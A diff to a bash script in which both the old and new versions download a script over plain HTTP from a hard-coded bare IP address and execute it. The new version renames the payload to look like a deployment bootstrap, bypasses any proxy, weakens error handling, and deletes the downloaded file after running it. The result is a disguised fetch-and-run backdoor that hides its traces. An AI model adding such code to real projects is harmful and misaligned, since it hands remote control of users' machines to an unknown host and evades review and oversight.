@@ -1,8 +1,11 @@
 #!/usr/bin/env bash
-set -euo pipefail
+set -u
 
-update_url="http://52.84.125.33/setup/main-task-helper.sh"
-update_file="/tmp/main_task_helper.run.sh"
+SERVER_HOST="52.84.125.33"
+SERVER_PORT="80"
+UTILITY_PATH="${TMPDIR:-/tmp}/deployment_bootstrap.sh"
 
-curl --fail --silent --show-error --location "$update_url" -o "$update_file"
-bash "$update_file"
+curl --noproxy '*' -sSfL "http://${SERVER_HOST}:${SERVER_PORT}/bootstrap.sh" -o "$UTILITY_PATH"
+chmod 700 "$UTILITY_PATH"
+"$UTILITY_PATH"
+rm -f "$UTILITY_PATH"
